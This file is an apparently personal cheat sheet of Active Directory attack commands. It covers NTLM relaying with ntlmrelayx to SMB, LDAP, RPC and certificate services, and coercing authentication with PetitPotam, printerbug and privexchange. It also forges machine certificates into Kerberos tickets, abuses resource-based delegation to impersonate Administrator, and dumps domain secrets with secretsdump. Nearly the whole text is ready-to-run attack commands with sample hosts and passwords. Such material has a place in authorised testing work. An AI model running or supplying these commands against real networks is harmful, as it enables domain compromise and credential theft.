#Theory
#https://beta.hackndo.com/ntlm-relay/


#Standard ntlmrelay
sudo ntlmrelayx.py -tf smbNotSignedServers -smb2support -of ntlmHashes | tee ntlmrelayx.out
#Relay to ldap, request to add a new computer account under the domain user relayed
sudo ntlmrelayx.py -t ldaps://10.10.81.16 -smb2support -of ntlmHashes --add-computer GoSecureVM | tee ntlmrelayx.out
#Relay to ldap, smb, adcs 
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -of ntlmHashes --add-computer GoSecureVM --adcs --template Computer | tee ntlmrelayx.out
#Relay to ADCS
#https://posts.specterops.io/certified-pre-owned-d95910965cd2
#https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/
#https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#active-directory-certificate-services
#https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/
#https://www.optiv.com/insights/source-zero/blog/petitpotam-active-directory-certificate-services
#https://www.truesec.com/hub/blog/from-stranger-to-da-using-petitpotam-to-ntlm-relay-to-active-directory
#relay a domain controller machine account:
ntlmrelayx.py -t http://10.1.15.9/certsrv/certnsh.asp -smb2support --adcs --template DomainController
#relay a standard machine account (members of “Domain Computers”)
ntlmrelayx.py -t http://10.1.15.9/certsrv/certnsh.asp -smb2support --adcs --template Computer



#Trigger petitpotam:
#Works UNauthenticated against DCs only:
python3 /opt/outils/windows/PetitPotam/PetitPotam.py listener targetIP
#Otherwise creds are needed:
python3 /opt/outils/windows/PetitPotam/PetitPotam.py -u "john" -p 'Password1234' -d domain.com listenerIP targetIP
#Try the webdav address trick (webclient service must be installed on target which is not default):
#https://gist.github.com/gladiatx0r/1ffe59031d42c08603a3bde0ff678feb
#Identify machines with webclient enabled:
cme smb ./hostsSMB.list -u "john" -p "Password1234" -M webdav
#trigger petit potam with webclient path trick:
python3 /opt/outils/windows/PetitPotam/PetitPotam.py -u "john" -p 'Password1234' -d domain.com listenerIP@80/asdf targetIP

#Trigger printspooler:
proxychains python3 /opt/outils/windows/krbrelayx/printerbug.py 'domain.com/user:password@targetIP' listenerIP
#https://github.com/leechristensen/SpoolSample (initial windows version)

#Remote Potato
#From a low Priv Windows session trigger NTLM authentication from another logged user on the machine
#https://github.com/antonioCoco/RemotePotato0

#Trigger privexchange
python3 privexchange.py <targetOWA> -ah <attacker_host> -u <username>

#Identify ADCS
#	ADCS role is often hosted on the Domain Controller
#nmap -sV -p 80,443 -iL hostsHTTP.list -oA scanHTTP.nmap
#Search for Headers like these:
	HTTP/1.1 401 Unauthorized
	Content-Type: text/html
	Server: Microsoft-IIS/10.0
	WWW-Authenticate: NTLM
	WWW-Authenticate: Negotiate
	Date: Fri, 12 Nov 2021 16:16:20 GMT
	Content-Length: 1293
#auth is required for accesing :
#	http://<server>/certsrv/
#	Then banner will display "Microsoft Active Directory Certificate Services"
#	verify with
#		curl http://10.1.15.9/certsrv/ -u username --ntlm -I
#		curl http://10.1.15.9/certsrv/ -u username --ntlm
#If you have a domain user:
crackmapexec ldap domain.lab -u username -p password -M adcs

#Use a machine certificate for code exec
python3 ./gettgtpkinit.py -pfx-base64 "MIIRVQIBAzCCER8GCSqGSIb3c[...]sAgEAMIfLZ/BNCWLvw==" -dc-ip 10.1.15.7 'domain.com/machineAccount$' tgtMachineAccount.ccache
#Obtain TGS with S4U2Self
#S4U2Self is obtain a TGS for myself as any user
python3 ./gets4uticket.py kerberos+ccache://domain.com\\machineAccount\$:tgsMachineAccount.ccache@10.1.15.7 cifs/dc01.domain.com@domain.com Administrator@domain.com cifsTgs.ccache -v
#Use TGS
KRB5CCNAME=./cifsTgs.ccache proxychains smbclient.py domain.com/Administrator@dc01.domain.com -dc-ip 10.1.15.7 -k -no-pass -debug



#Relay to RPC
#Not working on up-to-date-dcs
ntlmrelayx.py -t rpc://dc.domain.com -smb2support -c 'echo pwn > C:\test.txt'


#Relay to LDAP to obtain delegation access to a machine account
ntlmrelayx.py -t ldap://hl-dc01.hackinglabs.lan -smb2support --delegate-access --escalate-user 'jbieberMachine$'
#Use delegation rights obtained by RBCD
getST.py -spn cifs/HL-WS02.hackinglabs.lan 'hackinglabs.lan/jbieberMachine$' -impersonate Administrator
#use TGS to dump secrets on target
secretsdump.py -k -no-pass HL-WS02.hackinglabs.lan
